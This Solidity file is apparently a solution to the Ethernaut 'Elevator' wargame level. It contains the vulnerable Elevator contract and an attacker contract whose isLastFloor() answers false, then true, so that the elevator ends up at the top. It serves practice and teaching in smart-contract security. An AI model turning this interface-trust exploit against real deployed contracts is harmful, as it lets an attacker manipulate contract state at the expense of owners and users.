// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building{

  // ethernaut instance address
  address target = 0xA;
  Elevator e = Elevator(address(target));
  bool trigger = false;

   function isLastFloor(uint) external returns (bool){
     if(trigger == false){
       trigger = true;
       return false;
     }
     else
      return true;
   }

  function exploit() public{
    e.goTo(1);
  }

}